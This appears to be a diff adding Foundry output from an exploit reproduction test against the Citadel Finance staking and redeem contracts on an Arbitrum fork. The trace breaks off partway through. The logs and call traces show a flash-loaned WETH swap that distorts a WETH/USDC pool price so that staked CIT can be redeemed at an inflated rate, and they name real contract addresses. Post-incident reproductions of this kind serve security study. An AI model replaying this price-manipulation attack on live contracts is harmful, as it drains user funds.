@@ -1,0 +1,379 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/CitadelFinance_exp.sol:ContractTest
+[PASS] testExploit() (gas: 834636)
+Logs:
+  Exploiter total staked CIT amount (minus fee) before attack: 2599.940000000000000000
+  Exploiter WETH balance before attack: 0.000000000000000000
+  --------------------Start attack--------------------
+  Flashloaned amount of WETH to swap and manipulate WETH/USDC pair: 4500.000000000000000000
+  Available amount of CIT to redeem: 92.855000000000000000
+  Available amount of CIT to redeem in USDC: 371420000
+  --------------------End attack--------------------
+  Exploiter WETH balance after attack: 21.327628237750659425
+
+Traces:
+  [8673] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("arbitrum", 174659183 [1.746e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], "CitadelStaking")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CitadelRedeem: [0x34b666992fcCe34669940ab6B017fE11e5750799], "CitadelRedeem")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], "WETH_USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], "USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], "CIT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], "CamelotRouter")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1048561] ContractTest::testExploit()
+    ├─ [2623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81])
+    │   └─ ← [Return] [0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03], []
+    ├─ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
+    ├─ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
+    ├─ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x00000000000000000000000000000000000000000000008fd1c563cdb7540000)
+    │   └─ ← [Return]
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 2653000000000000000000 [2.653e21]
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 2653000000000000000000 [2.653e21]
+    ├─ [24801] CIT::approve(CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 2653000000000000000000 [2.653e21])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], value: 2653000000000000000000 [2.653e21])
+    │   ├─  storage changes:
+    │   │   @ 0xc4163a34d5d4eca04fc24ea1a8be834d717208690d61d55202096bb12bc901c4: 0 → 0x00000000000000000000000000000000000000000000008fd1c563cdb7540000
+    │   └─ ← [Return] true
+    ├─ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 2653000000000000000000 [2.653e21]
+    ├─ [239191] CitadelStaking::deposit(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 2653000000000000000000 [2.653e21], 1)
+    │   ├─ [2612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [30257] CIT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 2653000000000000000000 [2.653e21])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], value: 2653000000000000000000 [2.653e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc4163a34d5d4eca04fc24ea1a8be834d717208690d61d55202096bb12bc901c4: 0x00000000000000000000000000000000000000000000008fd1c563cdb7540000 → 0
+    │   │   │   @ 0x19b0c352b4dcf8ec3d31a59a6e80704e9bcd7b71313ac7e53a4607ad92a0dec5: 0x0000000000000000000000000000000000000000000005c13e74654f6d03c8ca → 0x0000000000000000000000000000000000000000000006511039c91d2457c8ca
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000008fd1c563cdb7540000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ [6428] CIT::transfer(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 53060000000000000000 [5.306e19])
+    │   │   ├─ emit Transfer(from: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], to: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], value: 53060000000000000000 [5.306e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa64977d4b7e01f8c7bab82a1819233ae99a7fbbac3597476019c463b6b15b756: 0x00000000000000000000000000000000000000000000000c0af479f7076296cd → 0x00000000000000000000000000000000000000000000000eeb4f76d74d9c96cd
+    │   │   │   @ 0x19b0c352b4dcf8ec3d31a59a6e80704e9bcd7b71313ac7e53a4607ad92a0dec5: 0x0000000000000000000000000000000000000000000006511039c91d2457c8ca → 0x00000000000000000000000000000000000000000000064e2fdecc3cde1dc8ca
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 14: 0x0000000000000000000000000000000000000000000005c13e74654f6d03c8ca → 0x00000000000000000000000000000000000000000000064e2fdecc3cde1dc8ca
+    │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce6b: 0 → 0x0000000000000000000000000000000000000000000000003782dace9d900000
+    │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0 → 1
+    │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce69: 0 → 0x00000000000000000000000000000000000000000000008cf16a66ed711a0000
+    │   │   @ 0x4155c2f711f2cdd34f8262ab8fb9b7020a700fe7b6948222152f7670d1fdf34f: 0x00000000000000000000000000000000000000000000090b1eac0db545fe9e20 → 0x000000000000000000000000000000000000000000000998101674a2b7189e20
+    │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce6c: 0 → 1
+    │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce6d: 0 → 1
+    │   │   @ 0xf9ce09b108db692395053dd01a39433c7f523275c08f1ea50eeae7dbb44c41d4: 0 → 0x00000000000000000000000000000000000000000000008cf16a66ed711a0000
+    │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce68: 0 → 0x00000000000000000000000043cf1856606df2cb22aedba1a3e23725f1594e81
+    │   └─ ← [Stop]
+    ├─ [1030] CitadelStaking::getTotalTokenStakedForUser(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81]) [staticcall]
+    │   └─ ← [Return] 2599940000000000000000 [2.599e21]
+    ├─ [267] CIT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter total staked CIT amount (minus fee) before attack", val: 2599940000000000000000 [2.599e21], decimals: 18)
+    ├─ [9796] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [267] CIT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
+    ├─ [0] VM::roll(174662726 [1.746e8])
+    │   └─ ← [Return]
+    ├─ [0] VM::warp(1706347536 [1.706e9])
+    │   └─ ← [Return]
+    ├─ emit log_string(val: "--------------------Start attack--------------------")
+    ├─ [472738] WETH_USDC::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21], 0, 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000)
+    │   ├─ [3296] WETH::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 4951075593957827651289 [4.951e21]
+    │   │   └─ ← [Return] 4951075593957827651289 [4.951e21]
+    │   ├─ [9796] USDC::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 11376827407693 [1.137e13]
+    │   │   └─ ← [Return] 11376827407693 [1.137e13]
+    │   ├─ [26900] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21])
+    │   │   ├─ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4500000000000000000000 [4.5e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x585ee325f1af85f6f3fd85e4ae1c2cf3022b18f1e606c34894149ba54f0331cf: 0x00000000000000000000000000000000000000000000010c65f9fcc82a77a6d9 → 0x00000000000000000000000000000000000000000000001873ee6ecdc0a7a6d9
+    │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [405462] ContractTest::uniswapV3FlashCallback(2250000000000000000 [2.25e18], 0, 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000)
+    │   │   ├─ [25308] WETH::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 4500000000000000000000 [4.5e21])
+    │   │   │   ├─ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 4500000000000000000000 [4.5e21]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 4500000000000000000000 [4.5e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0 → 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [3076] WETH::decimals() [staticcall]
+    │   │   │   ├─ [2336] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::decimals() [delegatecall]
+    │   │   │   │   └─ ← [Return] 18
+    │   │   │   └─ ← [Return] 18
+    │   │   ├─ emit log_named_decimal_uint(key: "Flashloaned amount of WETH to swap and manipulate WETH/USDC pair", val: 4500000000000000000000 [4.5e21], decimals: 18)
+    │   │   ├─ [94739] CamelotRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(4500000000000000000000 [4.5e21], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1706348536 [1.706e9])
+    │   │   │   ├─ [11680] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 4500000000000000000000 [4.5e21])
+    │   │   │   │   ├─ [10928] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 4500000000000000000000 [4.5e21]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 4500000000000000000000 [4.5e21])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000 → 0
+    │   │   │   │   │   │   @ 0x4d2f2a6998b357e93e98b4cd7d173d7f83b92a79d9df666333b30712af552da0: 0x00000000000000000000000000000000000000000000000bf563e4dabeb0bd21 → 0x0000000000000000000000000000000000000000000000ffe76f72d52880bd21
+    │   │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [3296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 220596413000945024289 [2.205e20], 497811843383 [4.978e11], 300
+    │   │   │   ├─ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   ├─ [5716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(4500000000000000000000 [4.5e21], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000006e7955c5fe
+    │   │   │   ├─ [59529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(0, 474482066942 [4.744e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [35397] USDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 474482066942 [4.744e11])
+    │   │   │   │   │   ├─ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 474482066942 [4.744e11]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 474482066942 [4.744e11])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000000000006e7955c5fe
+    │   │   │   │   │   │   │   @ 0x4d2f2a6998b357e93e98b4cd7d173d7f83b92a79d9df666333b30712af552da0: 0x00000000000000000000000000000000000000000000000000000073e7e5e937 → 0x000000000000000000000000000000000000000000000000000000056e902339
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   │   ├─ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 23329776441 [2.332e10]
+    │   │   │   │   │   └─ ← [Return] 23329776441 [2.332e10]
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 4720596413000945024289 [4.72e21], reserve1: 23329776441 [2.332e10])
+    │   │   │   │   ├─ emit Swap(sender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 4500000000000000000000 [4.5e21], amount1In: 0, amount0Out: 0, amount1Out: 474482066942 [4.744e11], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c00000000000000000073e7e5e93700000000000bf563e4dabeb0bd21 → 0x012c012c000000000000000000056e9023390000000000ffe76f72d52880bd21
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3296] WETH::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [staticcall]
+    │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [delegatecall]
+    │   │   │   │   └─ ← [Return] 72668070516983737917 [7.266e19]
+    │   │   │   └─ ← [Return] 72668070516983737917 [7.266e19]
+    │   │   ├─ [4412] CamelotRouter::getAmountsOut(72668070516983737917 [7.266e19], [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   ├─ [1716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(72668070516983737917 [7.266e19], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000001504ef82
+    │   │   │   └─ ← [Return] [72668070516983737917 [7.266e19], 352644994 [3.526e8]]
+    │   │   ├─ [7783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
+    │   │   ├─ [5783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
+    │   │   ├─ [267] CIT::decimals() [staticcall]
+    │   │   │   └─ ← [Return] 18
+    │   │   ├─ emit log_named_decimal_uint(key: "Available amount of CIT to redeem", val: 92855000000000000000 [9.285e19], decimals: 18)
+    │   │   ├─ [12192] CitadelStaking::getCITInUSDAllFixedRates(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 92855000000000000000 [9.285e19]) [staticcall]
+    │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 371420000000000000000 [3.714e20]
+    │   │   ├─ emit log_named_uint(key: "Available amount of CIT to redeem in USDC", val: 371420000 [3.714e8])
+    │   │   ├─ [132236] CitadelRedeem::redeem(1, 0, 30951666666666666666 [3.095e19], 1)
+    │   │   │   ├─ [5783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
+    │   │   │   ├─ [12192] CitadelStaking::getCITInUSDAllFixedRates(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30951666666666666666 [3.095e19]) [staticcall]
+    │   │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 123806666666666666664 [1.238e20]
+    │   │   │   ├─ [4442] CamelotRouter::getAmountsOut(123806666 [1.238e8], [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   ├─ [1736] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(123806666 [1.238e8], USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000158ca19e5a1add5c8
+    │   │   │   │   └─ ← [Return] [123806666 [1.238e8], 24844698768393491912 [2.484e19]]
+    │   │   │   ├─ [10049] CIT::burn(CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 30951666666666666666 [3.095e19])
+    │   │   │   │   ├─ emit Transfer(from: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], to: 0x0000000000000000000000000000000000000000, value: 30951666666666666666 [3.095e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x19b0c352b4dcf8ec3d31a59a6e80704e9bcd7b71313ac7e53a4607ad92a0dec5: 0x00000000000000000000000000000000000000000000064e2fdecc3cde1dc8ca → 0x00000000000000000000000000000000000000000000064c82546364b5269e20
+    │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000152cec37aa8c45c0186c → 0x00000000000000000000000000000000000000000000152b3ead41b41cc8edc2
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [25189] CitadelStaking::removeStaking(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 1, 30951666666666666666 [3.095e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf9ce09b108db692395053dd01a39433c7f523275c08f1ea50eeae7dbb44c41d4: 0x00000000000000000000000000000000000000000000008cf16a66ed711a0000 → 0x00000000000000000000000000000000000000000000008b43dffe154822d556
